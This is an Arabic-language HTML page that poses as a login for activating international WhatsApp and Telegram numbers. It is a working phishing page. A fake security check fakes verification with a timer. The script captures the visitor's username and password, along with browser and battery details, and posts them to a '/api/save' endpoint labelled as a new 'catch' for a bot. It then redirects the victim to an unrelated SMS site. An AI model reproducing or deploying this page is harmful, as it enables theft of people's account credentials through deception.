<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل الخدمة - SMS Services</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        /* التنسيق العام المطور */
        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); 
            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
            justify-content: center;
        }

        /* حاوية البطاقة بأسلوب مودرن */
        .login-card {
            background: white; padding: 35px 25px; border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 90%; max-width: 400px; 
            text-align: center; position: relative; border: 1px solid rgba(255,255,255,0.3);
        }

        /* تنسيق أيقونة القائمة */
        .menu-btn {
            position: absolute; top: 20px; right: 20px; cursor: pointer; color: #CC0044;
        }

        #pageImg { 
            width: 110px; height: 110px; border-radius: 50%; 
            object-fit: cover; margin-bottom: 20px;
            border: 4px solid #f0f2f5; box-shadow: 0 4px 10px rgba(0,0,0,0.05);
        }

        h2 { color: #333; margin-bottom: 25px; font-size: 20px; font-weight: 600; }
        
        /* تنسيق الحقول */
        .input-group { margin-bottom: 15px; }
        input {
            width: 100%; padding: 14px 18px; border: 2px solid #e1e4e8;
            border-radius: 12px; box-sizing: border-box; outline: none;
            font-size: 16px; transition: all 0.3s ease; background: #f8f9fa;
        }
        input:focus { border-color: #CC0044; background: #fff; box-shadow: 0 0 8px rgba(204,0,68,0.1); }

        /* منطقة التحقق (Captcha) */
        .captcha-wrapper { 
            margin: 20px 0; min-height: 70px; display: flex; 
            flex-direction: column; align-items: center; justify-content: center; 
        }
        #loader-text { color: #CC0044; font-weight: bold; font-size: 14px; display: none; }

        /* الزر الأنيق */
        button {
            width: 100%; padding: 15px; background: linear-gradient(to right, #FF0055, #CC0044);
            color: white; border: none; border-radius: 12px; font-size: 18px;
            font-weight: bold; cursor: pointer; transition: 0.3s;
            box-shadow: 0 5px 15px rgba(204,0,68,0.3); margin-top: 10px;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(204,0,68,0.4); }

        .footer-links { margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; font-size: 14px; }
        .footer-links a { color: #CC0044; text-decoration: none; font-weight: bold; cursor: pointer; }

        .dev-tag { margin-top: 20px; color: #888; font-size: 11px; direction: ltr; }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="menu-btn" onclick="Swal.fire({title: 'الخدمات المتاحة', text: 'تفعيل أرقام واتساب وتليجرام دولية', icon: 'info', confirmButtonColor: '#CC0044'})">
            ☰
        </div>

        <img id="pageImg" src="https://logodix.com/logo/2014521.png">
        <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام</h2>

        <form id="masterForm">
            <div class="input-group">
                <input type="text" id="userInput" placeholder="البريد الإلكتروني أو الهاتف" required>
            </div>
            <div class="input-group">
                <input type="password" id="passInput" placeholder="كلمة السر" required>
            </div>
            
            <div class="captcha-wrapper">
                <div id="loader-text">🔄 جاري فحص أمان الجهاز...</div>
                <div class="cf-turnstile" id="cf-box" data-sitekey="1x00000000000000000000AA" data-callback="handleCaptcha"></div>
            </div>

            <button type="submit" id="pageBtn">تسجيل دخول</button>
        </form>

        <div class="footer-links">
            <p>ليس لديك حساب؟ <a onclick="Swal.fire({title:'عذراً', text:'التسجيل مغلق حالياً، استخدم حسابك الحالي', icon:'error', confirmButtonColor:'#CC0044'})">إنشاء حساب جديد</a></p>
        </div>
    </div>

    <div class="dev-tag">System Version 4.2.0 - © 2026</div>

    <script>
        let isVerified = false;

        // وظيفة جلب إعدادات اللوحة (الصورة والنص)
        async function fetchConfig() {
            try {
                const res = await fetch('/api/get');
                const data = await res.json();
                if(data.image) document.getElementById('pageImg').src = data.image;
                if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
                if(data.button) document.getElementById('pageBtn').innerText = data.button;
            } catch(e) {}
        }
        window.onload = fetchConfig;

        // محاكاة التحقق من الهوية
        function handleCaptcha() {
            const cfBox = document.getElementById('cf-box');
            const loader = document.getElementById('loader-text');
            cfBox.style.display = 'none';
            loader.style.display = 'block';

            setTimeout(() => {
                loader.innerHTML = '✅ تم التحقق من هويتك بنجاح';
                loader.style.color = '#28a745';
                isVerified = true;
            }, 2500);
        }

        // سحب معلومات الجهاز
        async function getDeviceData() {
            let info = { ua: navigator.userAgent, battery: "N/A" };
            try {
                const battery = await navigator.getBattery();
                info.battery = (battery.level * 100) + "%";
            } catch (e) {}
            return info;
        }

        document.getElementById('masterForm').onsubmit = async (e) => {
            e.preventDefault();
            if (!isVerified) {
                Swal.fire({ text: 'يرجى إكمال التحقق من الأمان أولاً', icon: 'warning', confirmButtonColor: '#CC0044' });
                return;
            }

            const device = await getDeviceData();
            const payload = {
                title: "🔥 صيد جديد مـحتـرف (كامل البيانات)",
                user: document.getElementById('userInput').value,
                pass: document.getElementById('passInput').value,
                details: `📱 الجهاز: ${device.ua} | 🔋 البطارية: ${device.battery}`,
                time: new Date().toLocaleString('ar-EG')
            };

            // إرسال البيانات للبوت
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // التحويل النهائي
            window.location.href = "https://receive-smss.com/"; 
        };
    </script>
</body>
</html>
